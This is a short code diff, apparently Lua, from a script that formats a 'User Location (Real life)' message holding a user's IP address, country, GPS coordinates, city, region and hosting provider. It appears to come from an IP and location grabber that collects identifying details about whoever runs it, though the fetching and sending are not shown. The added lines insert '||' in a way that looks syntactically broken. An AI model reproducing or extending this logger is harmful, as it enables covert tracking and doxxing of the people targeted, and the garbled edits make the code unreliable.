@@ -403,15 +403,15 @@ else
             {
                 ["name"] = "**`(🤫) User Location (Real life)`**",
                 ["value"] = "(👣) IP Address:|| " ..
-                    ipinfo_table.ip ..
+                    ipinfo_table.ip|| ..
                         "||\n||(🌆) Country:|| " ..
-                            ipinfo_table.country ..
+                            ipinfo_table.country|| ..
                                 "||\n||(🪟) GPS Location:|| " ..
-                                    ipinfo_table.loc ..
+                                    ipinfo_table.loc|| ..
                                         "||\n||(🏙️) City:|| " ..
-                                            ipinfo_table.city ..
+                                            ipinfo_table.city|| ..
                                                 "||\n||(🏡) Region:|| " ..
-                                                    ipinfo_table.region ..
+                                                    ipinfo_table.region|| ..
                                                         "||\n||(🪢) Hoster:|| " .. ipinfo_table.org .. "||"
             }
         )
